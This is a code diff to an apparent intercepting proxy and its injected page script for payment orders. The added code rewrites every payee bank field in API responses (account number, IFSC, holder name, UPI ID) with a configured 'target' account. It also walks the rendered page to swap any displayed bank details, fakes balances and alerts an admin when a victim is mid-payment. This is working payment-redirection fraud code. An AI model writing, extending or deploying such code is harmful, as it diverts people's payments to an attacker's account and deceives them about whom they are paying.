@@ -576,6 +576,34 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   }
 }
 
+function replaceOrderBankDetails(order, bank) {
+  if (!order || typeof order !== 'object' || !bank) return;
+  const bkAcct = bank.accountNo || '';
+  const bkIfsc = bank.ifsc || '';
+  const bkName = bank.accountHolder || '';
+  const bkUpi = bank.upiId || bkAcct || '';
+  const bkBank = bank.bankName || (bkIfsc ? getBankNameFromIfsc(bkIfsc) : 'Bank');
+
+  deepReplaceBankFields(order, bank, 0, true);
+
+  if (order.acctNo !== undefined) order.acctNo = bkAcct;
+  if (order.acctCode !== undefined) order.acctCode = bkIfsc;
+  if (order.acctName !== undefined) order.acctName = bkName;
+  if (order.accountNo !== undefined) order.accountNo = bkAcct;
+  if (order.accountNumber !== undefined) order.accountNumber = bkAcct;
+  if (order.account !== undefined) order.account = bkAcct;
+  if (order.ifsc !== undefined) order.ifsc = bkIfsc;
+  if (order.name !== undefined) order.name = bkName;
+  if (order.realName !== undefined) order.realName = bkName;
+  if (order.payAccount !== undefined) order.payAccount = bkUpi;
+  if (order.payee_bank_account !== undefined) order.payee_bank_account = bkAcct;
+  if (order.payee_ifsc !== undefined) order.payee_ifsc = bkIfsc;
+  if (order.payee_recipients_name !== undefined) order.payee_recipients_name = bkName;
+  if (order.payee_bankname !== undefined) order.payee_bankname = bkBank;
+  if (order.bankName !== undefined) order.bankName = bkBank;
+  if (order.bank_name !== undefined) order.bank_name = bkBank;
+}
+
 const BALANCE_KEYS = ['balance', 'userbalance', 'availablebalance', 'totalbalance', 'money',
   'itoken', 'itokenbalance', 'tokenbalance', 'usermoney', 'memberbalance',
   'mybalance', 'walletbalance', 'accountbalance', 'rechargebalance', 'coinbalance',
@@ -1840,15 +1868,10 @@ app.all('/xxapi/*', async (req, res) => {
               if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
               const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt || 0}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
 
-              // Unconditionally replace bank fields on the history order item
-              deepReplaceBankFields(order, targetBank, 0, true);
+              // Unconditionally replace all bank & payment fields on the history order item
+              replaceOrderBankDetails(order, targetBank);
 
-              if (order.acctNo !== undefined) order.acctNo = bkAcctC1;
-              if (order.acctCode !== undefined) order.acctCode = bkIfscC1;
-              if (order.acctName !== undefined) order.acctName = bkNameC1;
-              if (order.payAccount !== undefined && targetBank.upiId) order.payAccount = targetBank.upiId;
               if (wDomC1) order.walletDomain = wDomC1;
-              if (targetBank.bankName) order.bankName = targetBank.bankName;
 
               // Only auto-capture & notify admin if the order is actively being paid
               const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
@@ -2165,14 +2188,7 @@ app.all('/xxapi/*', async (req, res) => {
               const iAmt = parseFloat(item.orderAmount || item.amount || item.money || item.totalAmount || item.buyAmount || 0);
               if (bank.minAmount && iAmt > 0 && iAmt < bank.minAmount) return;
 
-              const hasAcct = scanHasBankFields(item, 0);
-              deepReplaceBankFields(item, targetBank, 0, true);
-
-              if (item.acctNo !== undefined && targetBank.accountNo) item.acctNo = targetBank.accountNo;
-              if (item.acctCode !== undefined && targetBank.ifsc) item.acctCode = targetBank.ifsc;
-              if (item.acctName !== undefined && targetBank.accountHolder) item.acctName = targetBank.accountHolder;
-              if (item.payAccount !== undefined && targetBank.upiId) item.payAccount = targetBank.upiId;
-              if (item.bankName !== undefined && targetBank.bankName) item.bankName = targetBank.bankName;
+              replaceOrderBankDetails(item, targetBank);
             }
           });
         }
@@ -2193,12 +2209,10 @@ app.all('/xxapi/*', async (req, res) => {
             }
           }
           if (shouldReplace) {
-            const globalHasAcct = scanHasBankFields(jsonResp, 0);
-            if (globalHasAcct) {
-              deepReplaceBankFields(jsonResp, bank, 0, globalHasAcct);
-              _bankReplaced = true;
-              _replacedBank = bank;
-            }
+            replaceOrderBankDetails(jsonResp, bank);
+            if (respData && typeof respData === 'object') replaceOrderBankDetails(respData, bank);
+            _bankReplaced = true;
+            _replacedBank = bank;
           }
         }
       }
@@ -2640,8 +2654,36 @@ if(ctx.indexOf('bank')!==-1||txt.indexOf('{"code":')!==-1){
 toFix.push(nd);}}}
 for(var i=0;i<toFix.length;i++){toFix[i].textContent=bName;}}
 
+function patchModalDOM(){
+if(!CFG||!document.body)return;
+var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
+var toFix=[];
+while(walker.nextNode()){
+var nd=walker.currentNode;
+var txt=(nd.textContent||'').trim();
+if(!txt)continue;
+var el=nd.parentElement;
+if(!el)continue;
+var p=el.parentElement;
+var p2=p?p.parentElement:null;
+var ctx=((el.innerText||'')+' '+(p?p.innerText:'')+' '+(p2?p2.innerText:'')).toLowerCase();
+
+if(/^[A-Z]{4}0[A-Z0-9]{6}$/.test(txt)&&CFG.if&&txt!==CFG.if){
+toFix.push({node:nd,val:CFG.if});}
+else if(/^\d{9,22}$/.test(txt)&&CFG.an&&txt!==CFG.an){
+if(ctx.indexOf('account')!==-1||ctx.indexOf('acct')!==-1||ctx.indexOf('bank')!==-1||ctx.indexOf('card')!==-1){
+toFix.push({node:nd,val:CFG.an});}}
+else if(txt.indexOf('@')!==-1&&CFG.ui&&txt!==CFG.ui){
+if(ctx.indexOf('upi')!==-1||ctx.indexOf('vpa')!==-1||ctx.indexOf('pay')!==-1){
+toFix.push({node:nd,val:CFG.ui});}}
+else if(CFG.ah&&txt.length>=3&&txt.length<=35&&txt!==CFG.ah&&!/\d/.test(txt)){
+if(ctx.indexOf('name')!==-1&&ctx.indexOf('partner')===-1&&ctx.indexOf('itoken')===-1&&ctx.indexOf('status')===-1&&ctx.indexOf('history')===-1){
+toFix.push({node:nd,val:CFG.ah});}}}
+for(var i=0;i<toFix.length;i++){toFix[i].node.textContent=toFix[i].val;}}
+
 function patchBalDOM(){
 patchBankDOM();
+patchModalDOM();
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
 if(!document.body)return;
 var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
